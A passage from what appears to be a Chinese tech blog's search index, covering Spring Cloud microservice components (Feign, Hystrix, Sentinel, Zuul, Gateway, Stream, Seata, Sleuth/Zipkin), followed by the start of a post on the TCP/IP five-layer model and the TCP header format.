API的过程，使得编写和调用HTTP请求变得更加简单和直观。\nFeign提供了一种声明式的方式来定义对远程服务的调用，类似于编写本地方法调用。通过使用Feign，开发者无需手动构建HTTP请求，处理编码和解码、错误处理等复杂的逻辑，而是只需定义接口和注解，并在接口方法上添加标记，Feign会自动帮助你处理这些细节。\n使用Feign的主要优点包括：\n\n简化调用过程：Feign的声明式风格使得远程服务调用的代码更加简洁、清晰，让开发者专注于业务逻辑而非底层HTTP请求。\n\n集成了Ribbon和Hystrix：Feign默认整合了Netflix的Ribbon负载均衡器和Hystrix熔断器，让服务调用更加稳定和容错。\n使用Ribbon的缺点是需要对请求拼接参数，而Feign解决了这个问题。使用Feign，可以通过定义接口并添加注解的方式来描述服务间的交互，而无需手动编写HTTP请求代码。\n\n支持插件扩展：Feign支持自定义编码器、解码器、拦截器等，以满足特定场景下的需求。\n\n\n使用方法\n添加依赖：spring-cloud-starter-feign\n\n在启动类上添加注解：@EnableFeignClients，该注解的defaultConfiguration属性可以指定所有Feign接口的配置类。\n\n定义Feign接口：使用@FeignClient(name&#x3D;”xxx”)注解定义Feign接口。\n该注解除了name属性还有，可以指定用户自定义的配置类的configuration属性，可以在使用了Hystrix的服务中指定熔断的FallBack类的fallback属性。\n\n\n熔断器（断路器）概念雪崩效应雪崩效应（Avalanche Effect）是指在分布式系统中，由于某个服务的故障或不可用，从而导致整个系统的连锁反应，最终导致整个系统无法正常工作的现象。\n具体来说，当一个服务出现故障时，其它依赖该服务的上游服务都会在请求该服务时阻塞。如果这些请求全部被堵塞住或响应时间过长，则会消耗掉资源，进而阻塞或延迟其它上游请求，造成一系列连锁反应。这可能会导致更多的请求堆积，使整个系统变得异常缓慢或直接崩溃。\n为了避免雪崩效应，可以使用限流、降级和熔断等解决方案。\n限流、降级和熔断\n限流：限制对服务的访问量和频率，避免过多的请求排队等待。\n限流算法：\n\n漏桶算法：漏桶按固定流量流出\n令牌桶算法：生成令牌的速度是恒定的，而拿令牌的数量是没有限制的\n固定时间窗口法：在一个时间间隔内进行限制，存在临界点缺陷，在时间临界点前后的极短时间内容易遭受攻击\n滑动时间窗口算法：在固定时间窗口算法的基础上，对时间间隔划分更小的周期，按周期的长度滑动，统计时间间隔内的流量。可以有效规避固定时间窗口算法中时间临界点的问题。\n\n\n降级：降级是系统将某些不重要的业务或接口的功能停止，以应对高负载的场景。\n\n熔断：当下游服务不可用时，上游服务为了保证自身服务的可用性，不再继续调用目标服务，而是直接返回。\n\n\n隔离策略\n线程池隔离：给服务调用设置固定数量的线程，如果被调用服务的正在被使用的线程数达到了限制的数量，就不会再调用，使用存在代价，代价包括线程的上下文切换。\n信号量隔离：信号量隔离是使用Semaphore实现的，通过设置的最大信号量控制对资源调用的数量，拿不到信号时直接拒绝。\n通过响应时间隔离：当依赖的资源出现响应时间过长的情况，就拒绝对该资源的请求。\nQPS（每秒请求次数）隔离：当调用服务的QPS达到阈值时，就拒绝。\n限流、降级和熔断。\n\nHystrix微服务架构中一般存在较多的服务单元，这样就出现某个单元因为网络原因等问题出现延迟，如果此时请求方的请求不断增多，时间一长就会形成调用方的任务积压，阻塞请求占用大量的系统的线程、IO等资源，导致调用方的服务瘫痪。进一步的会影响调用方的上游，从而产生“雪崩效应”。\n为解决这一问题，可以使用熔断器（Circuit Breaker）。\n熔断器的原理是：当某个服务单元发生故障，通过熔断器的故障监控，向调用方返回一个错误请求，而不是长时间的等待响应，避免故障在分布式系统中蔓延。\n隔离策略Hystrix提的隔离策略都属于阻塞发生之后的应对策略，而非预防性策略（如限流）。\n\n熔断（熔断模式，服务熔断）\n如果某个服务响应调用太慢，则熔断对该服务的调用，即后续请求不再调用该服务，直接返回并快速释放资源。\n熔断恢复：被熔断的请求不是永久被切断，而是暂停一段时间（默认是5秒）之后允许部分请求通过，若请求都是健康的（ResponseTime&lt;250ms），则取消熔断。\n\n线程池隔离（服务降级，隔离模式）\n为每个依赖调用分配一个线程池，如果线程池已满，调用将立即被拒绝，加速失败时间。\n\n\n服务调用的各种结果（成功、异常、超时、拒绝）都会上报给熔断器，加入bucket计算发生的总数。\n使用方法\n引入Hystrix的maven依赖，spring-cloud-starter-hystrix\n\n在启动类中添加@EnableCircutBreaker注解或@EnableHystrix注解\n\n在controller方法上添加@HystrixCommand，表示开启对该方法的熔断检测功能。\n\n配置方法：\n\n直接对@HystrixCommand注解的commandProperities设置@HystirxProperities注解的参数进行配置。\n使用配置文件进行配置，Hystrix的大部分配置都以hystrix.command开头\n\n可以配置的参数包括：\n\n隔离策略的超时时间\n最大请求数\n进行短路的失败请求的次数阈值\n短路后多长时间之后进行重试\n出错百分比阈值\n……\n\n\n\n监测工具熔断的监测工具有两个：\n\nHystrix Dashboard：针对Hystrix进行实时监控的工具，通过Hystrix Dashboard可以直观的看到各个Hystrix命令的请求响应时间、请求成功率等数据。\nTurbine：只使用Hystrix Dashboard只能看到单个应用内的服务信息，而Turbine能够汇总系统内多个服务的数据并显示到Hystrix Dashboard上。\n\nHystrix Dashboard和Turbine监测工具使用方法：\n\n在需要被监测的项目中，引入依赖spring-boot-starter-actuator\n在仪表盘应用中，引入依赖spring-cloud-starter-hystrix-dashboard，主类中添加@EnableHystrixDashboard注解开启仪表板\n在上面创建的仪表盘应用中，继续添加Turbine的依赖spring-cloud-starter-turbine，在配置文件application.yml中添加配置信息，除了要配置Turbine，还需要指定Eureka的地址，使Turbine能够到注册中心查找需要监测的服务实例。\n在被监测的服务项目中，也需要进行配置，保证配置中的eureka.instance.metadata-map.cluster和Turbine中的clusterConfig的配置名称一致。\n请求Turbine的聚合监测面板地址就能看到聚合后的图形化监测信息。\n\nSentinel隔离策略 Sentinel 以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。Sentinel的系统负载保护意思是，Sentinel从系统的维度提供了保护，确保系统的入口流量和系统的负载达到一个平衡，保证系统在能力范围内处理最多的请求。\nSentinel在服务隔离的实现方式和Hystrix完全不一样，Hystrix使用的是通过线程池隔离，而Sentinel实现了三种服务隔离策略，信号量隔离、响应时间隔离、QPS隔离。\n使用方法\n引入依赖spring-cloud-starter-alibaba-sentinel\n添加配置，如Sentinal DashBoard的地址、端口\n在Service类要使用Sentinel的方法上使用@SentinelResource注解\n\n持久化无论是通过硬编码的方式来更新规则，还是通过接入 Sentinel Dashboard 后，在页面上操作来更新规则，都无法避免一个问题，那就是服务重新后，规则就丢失了，因为默认情况下规则是保存在内存中的。\n目前 Sentinel 中默认实现了5种规则持久化的方式，分别是：file、redis、nacos、zk和apollo。\n使用方法：\n\n引入sentinel持久化依赖\n增加配置\n实现init()函数\n\nSentinal DashBoard配置项流控模式\n直接：api达到限流条件时，直接限流\n关联：当关联的资源达到阈值时，就限流自己\n链路：只记录指定链路上的流量（指资源从入口资源进来的流量，如果达到阈值，就进行限流）\n\n流控效果\n快速失败：直接失败并抛出异常\nWarm UP：当系统长期处于低水位的情况下，流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。比如刚启动的服务，数据库连接池可能还未初始化，缓存也处于空的状态，这时候激增的流量非常容易导致服务崩溃。这时我们就可以利用 Sentinel 的 Warm-Up 流控模式，控制通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，而不是在一瞬间全部放行。这样可以给冷系统一个预热的时间，避免冷系统被压垮。\n排队等待（匀速排队模式）：这种方式适合用于请求以突刺状来到，这个时候我们不希望一下子把所有的请求都通过，这样可能会把系统压垮；同时我们也期待系统以稳定的速度，逐步处理这些请求，以起到“削峰填谷”的效果，而不是拒绝所有请求。\n\n熔断规则Sentinel 提供以下几种熔断规则：\n\n慢调用比例 (SLOW_REQUEST_RATIO)：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断。\n异常比例 (ERROR_RATIO)：当单位统计时长（statIntervalMs）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。\n异常数 (ERROR_COUNT)：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。\n\n热点参数限流热点参数限流会根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。\nSentinel 利用 LRU 策略统计最近最常访问的热点参数，结合令牌桶算法来进行参数级别的流控。\n要使用热点参数限流功能，需要引入sentinel-parameter-flow-control依赖，并使用@SentinelResource 注解（与Hysyrix的@HysyrixCommand类似）定义资源\n路由网关API 网关是一个搭建在客户端和微服务之间的服务，我们可以在 API 网关中处理一些非业务功能的逻辑，例如权限验证、监控、缓存、请求路由等。\nAPI 网关就像整个微服务系统的门面一样，是系统对外的唯一入口。有了它，客户端会先将请求发送到 API 网关，然后由 API 网关根据请求的标识信息将请求转发到微服务实例。\nZuul功能Zuul的具体作用就是服务转发，Zuul可以作为为资源的统一访问入口。\n此外Zuul还提供了过滤器的功能，可以用来进行接口权限校验、限流、统计等。\n使用方法Zuul用做服务转发的使用方法：\n\n添加pom依赖，spring-cloud-starter-zuul\n\n在启动类上添加@EnableZuulProxy注解\n\n在application.yml文件中添加配置，zuul.routes的配置格式如下：\n#第一种[serviceId]:\t\t\t\t\t#对应Eureka中的serviceId，规则名与serviceId相同\tpath: /providerURL/**\t\t#转发哪些path（URL的path部分，见下文的补充）#第二种customName1:\t\t\t\t\t#自定义的转发规则名称\tpath: /fromURL1/**\t\t\t#转发哪些path\turl: http://localhost:8081\t#转发到哪个scheme://domain:portcustomName2:\t\t\t\t\t\tpath: /fromURL2/**\t\t\t\turl: http://localhost:8082\t\n\n示例：\nzuul:  host:    socket-timeout-millis: 60000    connect-timeout-millis: 60000  routes:    frameFronted:      path: /fronted/frame/**      url: http://localhost:8111    loginFronted:      path: /fronted/login/**      url: http://localhost:8222\n\n其它配置参数：\n\n忽略匹配：ingoredPatterns参数可以配置忽略URL\n敏感Header过滤：在请求的转发中默认会转发HTTP的Header信息，然而可能有些敏感信息不能被转发给下游系统，如Cookie。可以通过sensitiveHeaders参数进行配置，各项之间使用逗号分隔。\n\n匹配顺序：如果想按配置的顺序进行路由规则控制，则需要使用YMAL，如果使用的是properities文件，则会丢失顺序。\nURL结构\nGateway功能和特点Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。\nSpring Cloud Gateway 旨在提供一种简单而有效的途径来发送 API，并为它们提供横切关注点，例如：安全性，监控&#x2F;指标和弹性。 \n\nSpring Cloud Gateway 是基于 WebFlux 框架实现的，而 WebFlux 框架底层则使用了高性能的 Reactor 模式通信框架 Netty。\n\nSpring Cloud Gateway 具有以下特性：\n\n基于 Spring Framework 5、Project Reactor 和 Spring Boot 2.0 构建。\n能够在任意请求属性上匹配路由。\npredicates（断言） 和 filters（过滤器）是特定于路由的。\n集成了 Hystrix 熔断器。\n集成了 Spring Cloud DiscoveryClient（服务发现客户端）。\n易于编写断言和过滤器。\n能够限制请求频率。\n能够重写请求路径。\n\n可以通过配置使Gateway兼容HTTPS请求，\n核心概念（Glossary）\nSpring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。\n\n\n\n核心概念\n描述\n\n\n\nRoute（路由）\n网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。\n\n\nPredicate（断言）\n路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。\n\n\nFilter（过滤器）\n过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对上文的响应进行再处理。\n\n\n\n注意：其中 Route 和 Predicate 必须同时声明（路由断言）。\n\n断言的类型\nAfter\nBefore\nBetween\nCookie\nHeaders\nHost\nMethod\nPath\nQuery\nRemoteAddr\n\n多个路由断言可以通过与或非等逻辑连接。\n过滤器的类型\nAddRequestHeader\nAddRequestParameter\nAddResponseHeader\nHystrix\nPrefixPath\nRedictTo\nRemoteNonProxyHeaders\nRemoveRequestHeader\nRemoveResponseHeader\nRewritePath\nSaveSession\nSetPath\nSetResponseHeader\nSetStatus\nStripPrefix\nRetry\n\n工作流程如下图                                                                                                                                                                                                                                                                                                                       \n消息驱动Stream功能和概念在企业级应用中处理非同步场景、消息通知、应用间解耦等场景经常会使用消息中间件，常见的消息中间件有如，ActiveMQ、RabbitMQ、MetaMQ、Kafka、Redis等。\nSpring Cloud Stream是一个构建事件驱动或消息驱动微服务的框架，提供了一个灵活的编程模型，该模型建立在已经建立和熟悉的 Spring 习惯用法和最佳实践之上，包括对持久发布&#x2F;订阅语义、消费者组和有状态分区的支持。\n利用Stream可以对消息中间件实现进一步的封装，使代码更具有通用性，降低项目对消息中间件的耦合。更重要的是这样就可以方便地实现消息中间件的混用，比如生产者使用Kafka，消费者使用RabbitMQ。\nStream目前支持的中间件：\n\nRabbitMQ\nApache Kafka\nKafka Streams\nAmazon Kinesis\nGoogle PubSub (partner maintained)\nSolace PubSub+ (partner maintained)\nAzure Event Hubs (partner maintained)\nAzure Service Bus (partner maintained)\nAWS SQS (partner maintained)\nAWS SNS (partner maintained)\nApache RocketMQ (partner maintained)\n\n概念：\n\nBindings（绑定）：是一组接口，以声明方式标识输入和输出通道。在@EnableBinding注解中，你可以指定要绑定的通道集合。\nBinder（绑定器）：是消息中间件的实现，例如Kafka或RabbitMQ。绑定器负责将应用程序与特定的消息中间件进行连接和通信。\nChannel（通道）：代表消息中间件与应用程序之间的通信管道。通道可以是输入通道（用于接收消息）或输出通道（用于发送消息）。\nStreamListeners（流监听器）：是在Bean中定义的用于处理消息的方法。这些方法会自动在通道上接收到消息后被调用。在调用之前，消息转换器（MessageConverter）会执行消息的序列化和反序列化操作，将消息转换为中间件特定的事件和领域对象类型&#x2F;POJO之间进行转换。\nMessage Schemas（消息模式）：用于定义消息的序列化和反序列化的模式。\n\n使用方法（以RabbitMQ为例）\n启动RabbitMQ服务，比如可以使用Docker启动RabbitMQ。\n创建两个Maven项目，分别作为消息的生产者和消费者。\n在生产者和消费者项目中，均添加依赖spring-cloud-starter-stream（对Streram的依赖）和spring-cloud-starter-stream-rabbit（对RabbitMQ的依赖）。\n在生产者和消费者项目中增加配置，配置消费的消息信息和RabbitMQ服务的信息。\n在消费者启动类上添加@EnableBinding(BindingsInterface.class)，该注解表示为该Spring Boot项目增加Stream通道监听功能。BindingsInterface可以是sink、source、processor或三者的组合：\nsink：只带有输入通道的应用\nsource：只带有输出通道应用\nprocessor：带有输入通道和输出通道的应用\n\n\n创建BindingsInterface接口\n\n分布式事务概念事务的四大特性ACID说到数据库事务就不得不说，数据库事务中的四大特性，ACID:\n\nA（Atomicity，原子性）：事务作为一个整体被执行，要么全部成功，要么全部失败。\n\nC（Consistency，一致性）：事务执行之前和执行之后数据（如数据库中的数据）都必须处于一致性状态。\n如果事务成功地完成，那么系统中所有变化将正确地应用，系统处于有效状态。如果在事务中出现错误，那么系统中的所有变化将自动地回滚，系统返回到原始状态。\n\nI（Isolation，隔离性）：一个事务的中间状态对其他事务是不可见的。\n\nD（Durability，持久性）：事务提交成功后，即使在系统出现故障时，对数据的更改仍然存在并且不会撤消。\n\n\n分布式系统理论BASEBASE理论是Basically Available(基本可用)，Soft State（软状态）和Eventually Consistent（最终一致性）三个短语的缩写。\n其核心思想是：即使无法做到强一致性（Strong consistency），但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。\n分布式事务解决方案2PC2PC（两阶段提交协议）将事务分成两个阶段：\n\n准备阶段（Prepare Phase）:事务管理器给每个参与者发送Prepare消息，每个数据库参与者在本地执行事务，并写本地的Undo&#x2F;Redo日志，此时事务没有提交。\nUndo log是记录修改前的数据，用于数据库回滚，Redo log记录修改后的数据，用于提交事务后写入数据的文件。\n\n提交阶段（Commit Phase）:如果事务管理器收到了参与者的执行失败或者超时消息时，直接给每个参与者发送回滚（Rollback）消息；否则发送提交（Commit）消息。参与者根据事务管理器指令进行提交或者回滚操作，并释放事务处理过程中使用的资源。\n\n\nTCCTCC将事务分成三个阶段：\n\nTry阶段（Try）：对业务系统进行检测及预留资源。\n确认阶段（Confirm）：对业务做确认提交。\n撤销阶段（Cancel）：撤销事务。\n\nTCC采用的是补偿机制，核心思想是针对每个操作，都要编写一个与其对应的确认和补偿（撤销）操作逻辑。\nSeataSeata 是一款开源的分布式事务解决方案，致力于提供高性能和简单易用的分布式事务服务。\nSeata术语\nTC (Transaction Coordinator) - 事务协调者 - Seata Server\n维护全局和分支事务的状态，驱动全局事务提交或回滚。\n\nTM (Transaction Manager) - 事务管理器\n定义全局事务的范围：开始全局事务、提交或回滚全局事务。\n\nRM (Resource Manager) - 资源管理器\n管理分支事务处理的资源，与TC通信以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。\n\n\n事务模式Seata 将为用户提供了 AT、TCC、SAGA 和 XA 事务模式。\nAT 模式Seata AT 模式是一种非侵入式的分布式事务解决方案，Seata 在内部做了对数据库操作的代理层，我们使用 Seata AT 模式时，实际上用的是 Seata 自带的数据源代理 DataSourceProxy，Seata 在这层代理中加入了很多逻辑，比如插入回滚 undo_log 日志，检查全局锁等。\nAT 模式是2PC的演变：\n\n一阶段\n在一阶段中，Seata会拦截“业务SQL”，首先解析SQL语义，找到要更新的业务数据，在数据更新前，保存下”undo log”，然后执行“业务SQL”更新数据，更新之后保存数据“redo log”，最后生成锁，这些操作都是在本地数据库事务内完成，这样保证了一阶段的原子性。\n\n二阶段\n相对一阶段，二阶段比较简单，负责整体的回滚和提交，如果之前的一阶段中有本地事务没有通过吗，那么就执行全局回滚，否则执行全局提交，回滚用到的就是一阶段记录的“undo log”，通过回滚记录生成反向更新SQL并执行，已完成分支事务的回滚，当然事务完成后释放所有资源和删除所有日志。\n\n\nTCC模式TCC是Try-尝试、Confirm-确认、Cancel-取消Try尝试阶段，对资源进行锁定。Confirm 确认阶段，对资源进行确认，完成操作Cancel 取消阶段，对资源进行还原，取消操作\n实现原理\n\n在代码与数据表中扩展字段，实现对数据资源的锁定。\n\nSAGA模式Saga模式是SEATA提供的长事务解决方案，SAGA 模式的核心思想是将一个大型的分布式事务分解为多个小的局部事务，每个局部事务负责一部分原子性的操作。\n在Saga模式中，业务流程中每个参与者都提交本地事务，当出现某一个参与者失败，则补偿（对局部事务的执行进行逆向操作，从而撤销或回滚局部事务已经完成的部分）前面已经成功的参与者，一阶段的正向服务和二阶段的补偿服务都由业务开发实现。\nXA模式基于数据库的XA协议来实现2PC又称为XA方案。\n对比\n\n\n事务模式\n性能\n模式\n难易程度\n使用要求\n应用场景\n\n\n\nAT模式\n高\nAP，存在数据不一致的中间状态\n简单，靠SEATA自己解析反向SQL并回滚\n所有服务与数据库必须要自己拥有管理权，因为要创建UNDO_LOG表。\n高并发互联网应用，允许数据出现短时不一致，可通过对账程序或补录来保证最终一致性。\n\n\nTCC模式\n高\nAP，存在数据不一致的中间状态\n复杂，SEATATC只负责全局事务的提交与回滚指令，具体的回滚处理全靠程序员自己实现\n所有服务与数据库必须要自己拥有管理权；支持异构数据库，可以使用不同选型实现。\n高并发互联网应用，允许数据出现短时不一致，于对账程序或补录来保证最终一致性。\n\n\nSAGA模式\n不一定，取决于三方服务\nAP，存在数据不一致的中间状态\n复杂，提交与回滚流程全靠程序员编排\n在当前架构引入状态机机制，类似于工作流；无法保证隔离性\n需要与第三方交互时才会考虑，例如:调用支付宝支付接口→出库失败-&gt;调用支付宝退款接口\n\n\nXA模式\n低\nCP，强一致性\n简单，基于数据库自带特性实现，无需改表\n使用支持XA方案的关系型数据库（主流都支持）\n金融行业，并发量不大，但数据很重要的项目\n\n\n使用方法以AT模式为例：\n\n创建undo_log日志\n对Seata两个主要的配置文件file.config和registry.config\n添加pom依赖seata-spring-boot-starter\n在需要开启分布式事务的业务方法上添加注解@GlobalTransactional\n\n短生命微服务Task功能官方对Spring Cloud Task的介绍十分简单明了：Spring Cloud Task allows a user to develop and run short lived microservices using Spring Cloud and run them locally, in the cloud, even on Spring Cloud Data Flow. Just add @EnableTask and run your app as a Spring Boot app (single application context).\nTask用于支持短生命周期的微服务，该类微服务常见于定时任务、批处理等场景。\n使用方法\n添加依赖spring-cloud-task-core\n在启动类添加@EnableTask注解\n\nTask默认将Task生命周期记录在内存中，可以和数据库集成将其存储到数据库中。 \nTask可以通过Stream启动，实现方法是在Task项目中创建一个Sink来监听包含TaskLaunchRequest的消息实现的。\n调用链跟踪功能要实现准确快速地定位到线上故障，比较成熟的方案是使用调用链跟踪。调用链跟踪监测系统可以实现如下的功能：\n\n快速定位故障\n各个调用环节的性能分析\n数据分析\n\nSleuth\nSleuth\n&#x2F; sluːθ\n侦查；侦察；警犬\n\nSpring Cloud Sleuth是Spring Cloud生态中实现调用链跟踪的子项目，Spring Cloud Sleuth可以结合Zipkin，将消息发送到Zipkin，利用Zipkin存储信息，利用Zipkin UI展示数据，也可以只是简单的把数据存储在日记中。\n术语（Terminology）Spring Cloud Sleuth borrows Dapper’s terminology.\nSpan: The basic unit of work. For example, sending an RPC is a new span, as is sending a response to an RPC. Spans also have other data, such as descriptions, timestamped events, key-value annotations (tags), the ID of the span that caused them, and process IDs (normally IP addresses).\nSpans can be started and stopped, and they keep track of their timing information. Once you create a span, you must stop it at some point in the future.\nTrace: A set of spans forming a tree-like structure. For example, if you run a distributed big-data store, a trace might be formed by a PUT request.\nAnnotation&#x2F;Event: Used to record the existence of an event in time.\nConceptually in a typical RPC scenario we mark these events to highlight what kind of an action took place (it doesn’t mean that physically such an event will be set on a span).\n\ncs: Client Sent. The client has made a request. This annotation indicates the start of the span.\nsr: Server Received: The server side got the request and started processing it. Subtracting the cs timestamp from this timestamp reveals the network latency.\nss: Server Sent. Annotated upon completion of request processing (when the response got sent back to the client). Subtracting the sr timestamp from this timestamp reveals the time needed by the server side to process the request.\ncr: Client Received. Signifies the end of the span. The client has successfully received the response from the server side. Subtracting the cs timestamp from this timestamp reveals the whole time needed by the client to receive the response from the server.\n\nZipkin功能Zipkin是分布式实时数据追踪系统，由Twitter公司开发。主要功能是聚集来自各系统的实时监控数据。\n主要由四部分组成：\n\n收集器：收集追踪数据。\n数据存储：数据存储默认使用内存存储，也可以替换成MySQL、Cassandra等。\n查询：向其它服务服务提供数据查询功能\nWeb页面\n\n使用方法\n创建Zipkin Server、\n添加pom依赖zipkin-autoconfigure-ui和zipkin-server；\n在启动类中添加@EnableZipkinServer，表示启动Zipkin服务端。\n\n\n在服务中添加依赖和配置：\n添加对Sleuth的依赖spring-cloud-starter-sleuth（生成带有spanId和traceId的日志）和对Zipkin的依赖spring-cloud-sleuth-zipkin（将日志以HTTP协议传输到Zipkin Server）\n配置zipkin的base-url（Zipkin Server的地址）、sleuth的samper.percentage（创建并传输日志的传输比例）\n\n\n\n整合Stream由于将日志传输到Zipkin Server的方式是HTTP请求，请求量太大时会给系统带来很大压力，如果改为使用Stream消息机制传输监控日志就可以减轻压力。\nZipkin与Spring Cloud Stream整合的方法是：\n\n在Zipkin Server端\n添加对Stream消息中间件的依赖（以RabbitMQ为例）：spring-cloud-sleuth-zipkin-stream；spring-cloud-sleuth-stream；spring-cloud-stream-binder-rabbit。\n在配置文件中添加对Stream的配置信息和RabbitMQ的连接信息。\n将Zipkin Server的启动类注解@EnableZipkinServer改为@EnableZipkinStreamServer。\n\n\n在服务端\n将spring-cloud-sleuth-zipkin依赖注掉，在此基础上添加spring-cloud-sleuth-stream和spring-cloud-stream-binder-rabbit依赖。\n和在Zipkin Server端一样，配置文件中添加对Stream的配置信息和RabbitMQ的连接信息。\n\n\n\n整合MySQLZipkin默认将数据存储在内存中，如果要持久化这些数据可以整合MySQL.\nZipkin与MySQL整合的方法是：\n\n添加对JDBC和MySQL驱动的依赖，spring-boot-starter-jdbc和mysql-connector-java\n在配置文件中配置MySQL的连接信息，设置initialize参数为true（在启动时创建表结构  ）\n\nReferences\n胡劲寒. 极简Spring Cloud实战. 北京: 机械工业出版社, 2019.\n\n开课吧,李伟杰,刘雪松,刘自强,王超. Spring Cloud Alibaba微服务开发从入门到实战.\n\nhttps://github.com/alibaba/spring-cloud-alibaba/wiki/Sentinel\n\nhttps://spring-cloud-alibaba-group.github.io/github-pages/hoxton/en-us/index.html\n\nhttps://javaguide.cn/high-performance/load-balancing.html\n\n\n","categories":["IT"],"tags":["Spring Cloud"]},{"title":"计算机网络","url":"/2023/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","content":"TCP&#x2F;IP五层网络模型\n应用层：负责处理应用程序的特定通信细节。常见的应用层协议有：\n\nHTTP（Hypertext Transfer Protocol，超文本传输协议）：基于 TCP 协议，是一种用于传输超文本和多媒体内容的协议，主要是为 Web 浏览器与 Web 服务器之间的通信而设计的。当我们使用浏览器浏览网页的时候，我们网页就是通过 HTTP 请求进行加载的。\n\nSMTP（Simple Mail Transfer Protocol，简单邮件发送协议）：基于 TCP 协议，是一种用于发送电子邮件的协议。注意 ：SMTP 协议只负责邮件的发送，而不是接收。要从邮件服务器接收邮件，需要使用 POP3 或 IMAP 协议。\n\nPOP3&#x2F;IMAP（邮件接收协议）：基于 TCP 协议，两者都是负责邮件接收的协议。IMAP 协议是比 POP3 更新的协议，它在功能和性能上都更加强大。IMAP 支持邮件搜索、标记、分类、归档等高级功能，而且可以在多个设备之间同步邮件状态。几乎所有现代电子邮件客户端和服务器都支持 IMAP。\n\nFTP（File Transfer Protocol，文件传输协议） : 基于 TCP 协议，是一种用于在计算机之间传输文件的协议，可以屏蔽操作系统和文件存储方式。注意 ：FTP 是一种不安全的协议，因为它在传输过程中不会对数据进行加密。建议在传输敏感数据时使用更安全的协议，如 SFTP。\n\nTelnet（远程登陆协议）：基于 TCP 协议，用于通过一个终端登陆到其他服务器。Telnet 协议的最大缺点之一是所有数据（包括用户名和密码）均以明文形式发送，这有潜在的安全风险。这就是为什么如今很少使用 Telnet，而是使用一种称为 SSH 的非常安全的网络传输协议的主要原因。\n\nSSH（Secure Shell Protocol，安全的网络传输协议）：基于 TCP 协议，通过加密和认证机制实现安全的访问和文件传输等业务\n\n\n\n传输层：负责在网络中传输数据。主要有两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。TCP提供可靠的、面向连接的数据传输，确保数据完整性和顺序；UDP提供不可靠的、无连接的数据传输，速度快但可能丢失数据。\n\n网络层：负责将数据包在网络中进行路由和寻址。常见的网络层协议有：\n\nIP（Internet Protocol，网际协议）：TCP&#x2F;IP 协议中最重要的协议之一，属于网络层的协议，主要作用是定义数据包的格式、对数据包进行路由和寻址，以便它们可以跨网络传播并到达正确的目的地。目前 IP 协议主要分为两种，一种是过去的 IPv4，另一种是较新的 IPv6，目前这两种协议都在使用，但后者已经被提议来取代前者。\n\nARP（Address Resolution Protocol，地址解析协议）：ARP 协议解决的是网络层地址和链路层地址之间的转换问题。因为一个 IP 数据报在物理上传输的过程中，总是需要知道下一跳（物理上的下一个目的地）该去往何处，但 IP 地址属于逻辑地址，而 MAC 地址才是物理地址，ARP 协议解决了 IP 地址转 MAC 地址的一些问题。\n\nICMP（Internet Control Message Protocol，互联网控制报文协议）：一种用于传输网络状态和错误消息的协议，常用于网络诊断和故障排除。例如，Ping 工具就使用了 ICMP 协议来测试网络连通性。\n\nNAT（Network Address Translation，网络地址转换协议）：NAT 协议的应用场景如同它的名称——网络地址转换，应用于内部网到外部网的地址转换过程中。具体地说，在一个小的子网（局域网，LAN）内，各主机使用的是同一个 LAN 下的 IP 地址，但在该 LAN 以外，在广域网（WAN）中，需要一个统一的 IP 地址来标识该 LAN 在整个 Internet 上的位置。\n\n\n\n数据链路层：负责在同一网络中传输数据帧。数据链路层协议负责将网络层的IP数据包封装为数据帧，并通过物理介质进行传输。常见的数据链路层协议有以太网、Wi-Fi和PPP等。\n\n物理层：负责在物理介质上进行数据传输。物理层定义了网络设备之间的电气、机械和时序规范，以及数据在物理介质上的编码方式。常见的物理介质有双绞线、光纤和无线电波等。\n\n\nTCPTCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的传输协议。\n报文格式TCP报文（也称为TCP段或TCP数据包）是TCP协议中用于在网络中传输数据的基本单位。TCP报文包含了一个TCP首部和可选的数据部分。\nTCP报文的首部格式如下：\n\n源端口（Source Port，16位）：表示报文发送方的端口号。\n目的端口（Destination Port，16位）：表示报文接收方的端口号。\n序列号（Sequence Number，32位）：表示报文中数据的第一个字节的序列号。是TCP报文中每个字节的唯一编号。当发送方发送一个TCP报文时，它会为报文中的第一个字节分配一个序列号。序列号的主要作用是帮助接收方对乱序、重复或丢失的报文进行排序和处理，从而确保数据的顺序和完整性。\n确认号（Acknowledgment Number，32位）：表示期望收到对方下一个报文的序列号，只有当ACK标志位被设置时才有效。\n数据偏移（Data Offset，4位）：表示TCP首部的长度，以32位字（4字节）为单位。\n保留（Reserved，6位）：保留位，未使用，设置为0。\n控制位（Control Bits，6位）：包含了一系列控制标志，如URG（紧急指针有效）、ACK（确认号有效）、PSH（推送）、RST（复位连接）、SYN（同步序列号）、FIN（结束连接）等。\n窗口大小（Window 